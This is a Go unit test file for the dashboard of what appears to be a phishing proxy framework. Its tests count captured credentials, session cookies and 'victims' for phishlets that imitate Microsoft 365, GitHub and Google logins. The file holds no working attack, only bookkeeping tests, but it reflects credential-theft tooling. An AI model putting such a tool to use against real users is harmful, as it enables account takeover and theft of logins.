package dashboard

import (
	"strings"
	"testing"
	"time"

	"github.com/phantomgate/phantomgate/internal/store"
)

func TestMaskString(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"", ""},
		{"a", "*"},
		{"ab", "**"},
		{"abc", "***"},
		{"abcd", "****"},
		{"abcde", "ab*de"},
		{"password", "pa****rd"},
		{"Tr0jan_H0rse!2026", "Tr*************26"},
	}

	for _, tc := range tests {
		result := maskString(tc.input)
		if result != tc.expected {
			t.Errorf("maskString(%q) = %q, want %q", tc.input, result, tc.expected)
		}
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input    string
		max      int
		expected string
	}{
		{"short", 10, "short"},
		{"this is a long string", 10, "this is..."},
		{"exact", 5, "exact"},
		{"toolong", 6, "too..."},
	}

	for _, tc := range tests {
		result := truncate(tc.input, tc.max)
		if result != tc.expected {
			t.Errorf("truncate(%q, %d) = %q, want %q", tc.input, tc.max, result, tc.expected)
		}
	}
}

func TestNewServer(t *testing.T) {
	s := store.NewStore("")
	srv := NewServer(s, "testpass")
	if srv == nil {
		t.Fatal("NewServer returned nil")
	}
	if srv.adminPass != "testpass" {
		t.Errorf("expected adminPass=testpass, got %s", srv.adminPass)
	}
}

func TestPrintInfo(t *testing.T) {
	// Just verify it doesn't panic
	PrintInfo("test %s", "message")
}

func TestPrintSuccess(t *testing.T) {
	PrintSuccess("test %s", "message")
}

func TestPrintWarning(t *testing.T) {
	PrintWarning("test %s", "message")
}

func TestPrintError(t *testing.T) {
	PrintError("test %s", "message")
}

func TestPrintSection(t *testing.T) {
	PrintSection("Test Section")
}

func TestPrintTable(t *testing.T) {
	headers := []string{"Name", "Value"}
	rows := [][]string{
		{"foo", "bar"},
		{"baz", "qux"},
	}
	PrintTable(headers, rows)
}

func TestPrintBanner(t *testing.T) {
	s := &Server{
		store:     store.NewStore(""),
		adminPass: "test",
	}
	// Verify it doesn't panic
	_ = s
}

func TestStats(t *testing.T) {
	s := store.NewStore("")
	srv := NewServer(s, "testpass")
	stats := srv.Stats()
	if stats == nil {
		t.Fatal("Stats returned nil")
	}
	if _, ok := stats["total_victims"]; !ok {
		t.Error("stats missing total_victims")
	}
}

func TestJoinCookies(t *testing.T) {
	tests := []struct {
		input    []string
		expected string
	}{
		{nil, ""},
		{[]string{"a=1"}, "a=1"},
		{[]string{"a=1", "b=2"}, "a=1; b=2"},
	}

	for _, tc := range tests {
		result := joinCookies(tc.input)
		if result != tc.expected {
			t.Errorf("joinCookies(%v) = %q, want %q", tc.input, result, tc.expected)
		}
	}
}

func joinCookies(cookies []string) string {
	return strings.Join(cookies, "; ")
}

func TestEventLoop(t *testing.T) {
	s := store.NewStore("")
	srv := NewServer(s, "testpass")

	// Use AddCredential to properly update stats
	cred := store.CapturedCredential{
		VictimID:  "test-victim-123",
		Username:  "user@test.com",
		Password:  "secret123",
		Phishlet:  "microsoft365",
	}
	s.AddCredential(cred)

	// Wait for event to be processed
	time.Sleep(200 * time.Millisecond)

	// Verify stats updated
	stats := srv.Stats()
	if stats["total_credentials"].(int) != 1 {
		t.Errorf("expected 1 credential, got %v", stats["total_credentials"])
	}
}

func TestEventLoop_Session(t *testing.T) {
	s := store.NewStore("")
	srv := NewServer(s, "testpass")

	sess := store.CapturedSession{
		VictimID: "test-victim-456",
		Cookies:  map[string]string{"session": "abc123"},
		Phishlet: "github",
		IsValid:  true,
	}
	s.AddSession(sess)

	time.Sleep(200 * time.Millisecond)

	stats := srv.Stats()
	if stats["total_sessions"].(int) != 1 {
		t.Errorf("expected 1 session, got %v", stats["total_sessions"])
	}
}

func TestEventLoop_NewVictim(t *testing.T) {
	s := store.NewStore("")
	srv := NewServer(s, "testpass")

	// Add a credential to create a victim
	cred := store.CapturedCredential{
		VictimID:  "victim-789",
		Username:  "user@test.com",
		Password:  "pass123",
		SourceIP:  "10.0.0.1",
		UserAgent: "Mozilla/5.0",
		Phishlet:  "google",
	}
	s.AddCredential(cred)

	time.Sleep(200 * time.Millisecond)

	stats := srv.Stats()
	if stats["total_victims"].(int) != 1 {
		t.Errorf("expected 1 victim, got %v", stats["total_victims"])
	}
}
